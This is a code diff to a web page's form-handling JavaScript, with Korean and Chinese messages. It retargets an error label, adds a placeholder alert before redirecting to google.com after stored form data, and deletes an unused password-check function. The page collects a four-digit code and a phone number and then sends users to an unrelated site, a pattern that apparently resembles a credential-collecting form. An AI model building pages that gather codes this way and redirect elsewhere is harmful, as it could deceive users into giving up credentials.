@@ -20128,7 +20128,7 @@ body {
       
 
       if (!validateCode(password)) {
-        $('#codeError').text('인증 코드 형식이 잘못되었습니다. 1234, 1111 등은 사용 불가');
+        $('#passwordError').text('인증 코드 형식이 잘못되었습니다. 1234, 1111 등은 사용 불가');
         valid = false;
       }
 
@@ -20163,6 +20163,7 @@ body {
         } else {
             console.log('提交成功:', insertData);
             // 로그인 성공, 다음 페이지로 이동
+		alert("提示信息");
          window.location.href = 'https://www.google.com';
         }
     } catch (error) {
@@ -20213,30 +20214,7 @@ body {
       passwordField.type = type;
     }
 
-    // Function to handle form submission
-    function handleSubmit1() {
-      const password = document.getElementById("password").value;
-      const confirmPassword = document.getElementById("confirmPassword").value;
-      const passwordError = document.getElementById("passwordError");
-      const confirmPasswordError = document.getElementById("confirmPasswordError");
-      
-      // Validate password inputs
-      passwordError.textContent = "";
-      confirmPasswordError.textContent = "";
 
-      if (password.length < 4 || password.length > 4) {
-        passwordError.textContent = "비밀번호는 4자리 이상이어야 합니다.";
-        return;
-      }
-	  
-      if (password !== confirmPassword) {
-        confirmPasswordError.textContent = "비밀번호가 일치하지 않습니다.";
-        return;
-      }
-
-      // Display success message
-      alert("제출 성공!");
-    }
 
     // Limit phone input to digits only
     document.getElementById("phone").addEventListener("input", function (e) {
